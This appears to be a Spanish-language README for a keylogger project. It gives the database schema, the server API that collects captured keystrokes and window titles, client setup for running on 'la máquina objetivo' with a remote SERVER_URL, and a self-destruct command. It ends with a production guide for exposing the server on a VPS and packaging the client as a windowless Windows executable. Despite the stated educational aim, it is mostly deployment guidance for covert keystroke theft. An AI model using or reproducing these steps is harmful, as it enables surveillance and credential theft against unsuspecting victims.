## 🛠️ Guía de Despliegue e Instalación

### Prerrequisitos
- Python 3.8+
- MySQL Server

### Paso 1: Configurar la Base de Datos
Ejecuta el script SQL en tu servidor MySQL para crear la base de datos y la tabla:

```sql
CREATE DATABASE IF NOT EXISTS keylogger_db;
USE keylogger_db;

CREATE TABLE IF NOT EXISTS logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    window_title VARCHAR(255) NOT NULL,
    keystrokes TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### Paso 2: Configurar el Servidor (API)

1. Navega a la carpeta del servidor:
   ```bash
   cd server
   ```
2. Instala las dependencias:
   ```bash
   pip install -r requirements.txt
   ```
3. Edita `app.py` y configura tus credenciales de MySQL:
   ```python
   DB_HOST = "localhost"
   DB_USER = "tu_usuario"
   DB_PASSWORD = "tu_password"
   ```
4. Inicia el servidor:
   ```bash
   python app.py
   ```
   *El servidor escuchará en el puerto 5000.*

### Paso 3: Configurar el Cliente

1. Navega a la carpeta del cliente:
   ```bash
   cd client
   ```
2. Instala las dependencias:
   ```bash
   pip install -r requirements.txt
   ```
3. Edita `keylogger.py` y establece la IP de tu servidor:
   ```python
   SERVER_URL = "http://<IP-DEL-SERVIDOR>:5000/log"
   ```
4. Ejecuta el cliente (en la máquina objetivo):
   ```bash
   python keylogger.py
   ```

## 📡 Documentación de la API

### Endpoint: `POST /log`
Recibe los logs capturados por el cliente.

**Cuerpo de la petición (JSON):**
```json
{
  "window_title": "Bloc de notas - Sin título",
  "keystrokes": "Hola mundo [ENTER] esto es una prueba"
}
```

**Respuestas:**
- `201 Created`: Log guardado correctamente.
- `400 Bad Request`: Faltan datos en el JSON.
- `500 Server Error`: Error de conexión con la base de datos.

## ⚙️ Características Técnicas
- **Window Awareness:** El cliente detecta cambios de ventana activa y envía el buffer inmediatamente para mantener el contexto.
- **Buffer Local:** Acumula teclas localmente para reducir el tráfico de red.
- **Requests Fallback:** El cliente incluye una implementación manual de `HTTP Request` en caso de que la librería `requests` no esté instalada en la víctima.
- **Cross-Origin (CORS):** Habilitado en el servidor para permitir peticiones desde distintos orígenes durante pruebas.
  
## 🖥️ Uso del Dashboard
Accede a http://IP-DEL-SERVIDOR:5000 (o la IP pública de tu servidor).
Verás una tabla con la Hora (Azul), Ventana y Teclas (Verde).
La tabla se actualiza automáticamente cada 3 segundos.
💀 El botón "ELIMINAR CLIENTE"
En la parte superior derecha hay un botón rojo.

Acción: Activa una bandera global en el servidor.
Consecuencia: La próxima vez que el cliente envíe logs, el servidor responderá con {"command": "self_destruct"}´.
Resultado: El cliente ejecutará un comando de sistema para borrarse a sí mismo del disco y cerrar el proceso.

## 🤝 Contribuciones
Las contribuciones son bienvenidas, siempre y cuando mantengan el enfoque educativo del proyecto.

---

### 4. Guía de Despliegue "Producción" (Extra)

Si quieres desplegar esto en un entorno real (por ejemplo, el servidor en la nube y el cliente en tu PC), sigue estos pasos adicionales para tu documentación personal o `Wiki` del repo:

#### A. Despliegue del Servidor (VPS / Ubuntu)
1.  **Instalar MySQL y Python:**
    `sudo apt update && sudo apt install mysql-server python3-pip`
2.  **Hacer accesible el servidor:**
    En el código `app.py`, asegúrate de que al final dice:
    `app.run(host='0.0.0.0', port=5000)`
    Esto permite conexiones desde fuera.
3.  **Firewall:**
    Debes abrir el puerto 5000 en tu VPS (AWS, DigitalOcean, Azure):
    `sudo ufw allow 5000`
4.  **Ejecución persistente:**
    Usa `gunicorn` o `nohup` para que el servidor no se cierre al salir de la terminal:
    `nohup python3 app.py &`

#### B. Empaquetado del Cliente (Crear .exe)
Para que el cliente corra en Windows sin instalar Python, usa **PyInstaller** (que vi en tu requirements original):

1.  Instala PyInstaller: `pip install pyinstaller`
2.  Genera el ejecutable (sin consola negra):
    ```bash
    pyinstaller --noconsole --onefile keylogger.py
    ```
3.  El archivo final estará en la carpeta `dist/keylogger.exe`.
